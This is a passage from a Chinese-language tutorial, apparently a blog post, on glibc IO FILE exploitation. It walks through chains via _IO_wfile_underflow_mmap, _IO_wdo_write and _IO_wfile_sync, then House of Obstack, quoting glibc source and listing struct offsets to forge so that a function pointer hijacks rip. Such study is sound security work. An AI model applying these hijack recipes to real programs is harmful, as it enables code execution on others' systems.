<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下： 看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p>
<h3
id="利用_io_wdo_write函数控制程序执行流">利用_IO_wdo_write函数控制程序执行流</h3>
<p><code>_IO_wdo_write</code>的调用点很多，这里我选择一个相对简单的链：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">      _IO_wdo_write</span><br></pre></td></tr></table></figure></div>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li>
<li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li>
<li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li>
<li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li>
<li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">        _IO_wdo_write</span><br><span class="line">          __libio_codecvt_out</span><br><span class="line">              DL_CALL_FCT</span><br><span class="line">                  gs = fp-&gt;_codecvt-&gt;__cd_out.step</span><br><span class="line">                  *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下： 首先看<code>_IO_new_file_sync</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;<span class="comment">//调用到这里</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>只需要满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p>
<p>然后看<code>_IO_do_flush</code>宏：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure></div>
<p>根据<code>fp-&gt;_mode</code>的值选择调用<code>_IO_do_write</code>或者<code>_IO_wdo_write</code>。这里我们要调用后者，必须使<code>fp-&gt;_mode &gt; 0</code>。此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code>，第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code>。</p>
<p>接着看<code>_IO_wdo_write</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_wdo_write (FILE *fp, <span class="type">const</span> <span class="type">wchar_t</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 第三个参数必须要大于0</span></span><br><span class="line">  <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">// 不能进入这个分支</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                    data, data + to_do, &amp;new_data,</span><br><span class="line">                    write_ptr,</span><br><span class="line">                    buf_end,</span><br><span class="line">                    &amp;write_ptr);</span><br><span class="line">          <span class="comment">//......</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先<code>to_do</code>必须要大于<code>0</code>，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p>
<p>这个链基本需要控制<code>fp-&gt;_wide_data</code>，相比上两条链的约束条件要更多一点。</p>
<h3
id="使用_io_wfile_sync函数控制程序执行流">使用_IO_wfile_sync函数控制程序执行流</h3>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li>
<li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_sync</span><br><span class="line">    __libio_codecvt_length</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下： 直接看<code>_IO_wfile_sync</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="comment">// 不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="comment">// 需要进入到这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="type">off64_t</span> new_pos;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 这里直接返回-1即可</span></span><br><span class="line">      <span class="type">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">    delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">      <span class="type">int</span> nread;</span><br><span class="line">      <span class="type">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">               - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">    <span class="comment">// 调用到这里</span></span><br><span class="line">      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                      fp-&gt;_IO_read_base,</span><br><span class="line">                      fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。</p>
<p>然后看下<code>__libio_codecvt_encoding</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_encoding (<span class="keyword">struct</span> _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>直接设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。
## House of 琴瑟琵琶 | House of Obstack
这个攻击手段主要是利用<code>_IO_obstack_jumps</code>，其中<code>_IO_obstack_overflow</code>和
<code>_IO_obstack_xsputn</code> 都可以触发，攻击链如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_obstack_overflow</span><br><span class="line">        <span class="title function_">obstack_1grow</span> <span class="params">(obstack, c)</span>;</span><br><span class="line">                _obstack_newchunk (__o, <span class="number">1</span>);   </span><br><span class="line">                         new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">                                     (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_obstack_xsputn</span><br><span class="line">        <span class="title function_">obstack_grow</span> <span class="params">(obstack, data, n)</span>;;</span><br><span class="line">                _obstack_newchunk (__o, __len);</span><br><span class="line">                         new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">                                     (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</span><br></pre></td></tr></table></figure></div>
<p>但实际过程中<code>_IO_obstack_overflow</code>容易触发<code>assert (c != EOF);</code>
，所以一般选择第二条链。</p>
<p><code>_IO_obstack_jumps</code>中只有2个函数有赋值，其他都为空。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>_IO_obstack_overflow</code>和<code>_IO_obstack_xsputn</code>两个函数内容如下。为了避免绕过<code>_IO_obstack_overflow</code>中的<code>assert (c != EOF);</code>
，<strong>我们一般用<code>_IO_obstack_xsputn</code>。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_obstack_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);  <span class="comment">// 此处不可控</span></span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> _IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment">     space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n); <span class="comment">//执行此函数</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>函数中的<code>_IO_obstack_file</code>只是在<code>_IO_FILE_plus</code>后面加了一个<code>obstack</code>的指针。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>简单绕过一些内容后用运行到<code>obstack_grow</code>处，来调用<code>_obstack_newchunk</code>。</p>
